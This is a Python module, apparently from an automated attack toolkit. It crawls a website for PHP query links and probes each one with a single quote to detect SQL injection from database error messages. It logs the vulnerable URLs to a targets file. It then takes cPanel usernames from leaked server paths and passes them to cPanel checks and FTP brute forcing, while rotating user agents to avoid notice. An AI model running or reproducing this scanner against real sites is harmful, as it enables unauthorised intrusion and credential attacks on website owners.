import requests, re
import random
from core import printmodels
from tools import cpanel
from BruteForce import FTPBruteForce
from time import sleep


user_agents = [
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36',
    'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:43.0) Gecko/20100101 Firefox/43.0',
    'Mozilla/5.0 (Windows NT 6.1; rv:40.0) Gecko/20100101 Firefox/40.0',
    'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
    'Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:28.0) Gecko/20100101 Firefox/28.0'
]

def get_random_user_agent():
    return random.choice(user_agents)

def Exploit(site):
    
    agent = {'User-Agent': get_random_user_agent()}
    
    
    if site.startswith("http://"):
        site = site.replace("http://", "")
    elif site.startswith("https://"):
        site = site.replace("https://", "")
    
    try:
        
        GetLink = requests.get(f'http://{site}', timeout=10, headers=agent)
        urls = re.findall(r'href=[\'"]?([^\'" >]+)', str(GetLink.content))
        
        
        if len(urls) != 0:
            return CheckSqliURL(site, urls, agent)
        else:
            return None
    except requests.exceptions.Timeout as e:
        print(f"Timeout error for site {site}: {e}")
        sleep(5)  # Birkaç saniye bekle ve tekrar dene
        return Exploit(site)  # Tekrar deneyelim
    except requests.exceptions.ConnectionError as e:
        print(f"Connection error for site {site}: {e}")
        return None
    except requests.exceptions.HTTPError as e:
        print(f"HTTP error for site {site}: {e}")
        return None
    except requests.exceptions.RequestException as e:
        print(f"Request error for site {site}: {e}")
        return None
    except Exception as e:
        print(f"An unexpected error occurred: {e}")
        return None

def CheckSqliURL(site, urls, agent):
    MaybeSqli = []
    for url in urls:
        try:
            if '.php?' in str(url):
                MaybeSqli.append(site + '/' + url)
        except Exception as e:
            print(f"Error processing URL {url}: {e}")
            pass
    
    if len(MaybeSqli) != 0:
        return CheckSqli(MaybeSqli, site, agent)
    else:
        return printmodels.returnNo(site, 'N/A', 'Sql Injection', 'unknown')

def CheckSqli(MaybeSqli, site, agent):
    for url in MaybeSqli:
        try:
            error = ["DB Error", "SQL syntax;", "mysql_fetch_assoc", "mysql_fetch_array", "mysql_num_rows", 
                     "is_writable", "mysql_result", "pg_exec", "mysql_result", "mysql_num_rows", "mysql_query", "pg_query",
                     "System Error", "io_error", "privilege_not_granted", "getimagesize", "preg_match", "mysqli_result", 'mysqli']
            
            
            if url.startswith("http://"):
                url = url.replace("http://", "")
            elif url.startswith("https://"):
                url = url.replace("https://", "")
            
            for s in error:
                try:
                    Checksqli = requests.get(f'http://{url}\'', timeout=5, headers=agent)
                    
                    if s in str(Checksqli.content):
                        SQLI = url.replace("'", "")
                        if 'http://' not in SQLI:
                            with open('result/SqlInjection_targets.txt', 'a') as xx:
                                xx.write(f'http://{SQLI}\n')
                            try:
                                Username = re.findall('/home/(.*)/public_html/', str(Checksqli.content))[0]
                                cpanel.Check(site, Username, 'Cpanel')
                                FTPBruteForce.CheckFTPport(site, Username)
                            except Exception as e:
                                print(f"Error checking FTP or cPanel for {SQLI}: {e}")
                        return printmodels.returnYes(SQLI, 'N/A', 'Sql Injection', 'unknown')
                except requests.exceptions.Timeout as e:
                    print(f"Timeout error for URL {url}: {e}")
                    sleep(3)  
                    pass
                except requests.exceptions.ConnectionError as e:
                    print(f"Connection error for URL {url}: {e}")
                    pass
                except requests.exceptions.RequestException as e:
                    print(f"Request failed for URL {url}: {e}")
                    pass
                except Exception as e:
                    print(f"Unexpected error for URL {url}: {e}")
                    pass
        except Exception as e:
            print(f"Error processing URL {url}: {e}")
            pass
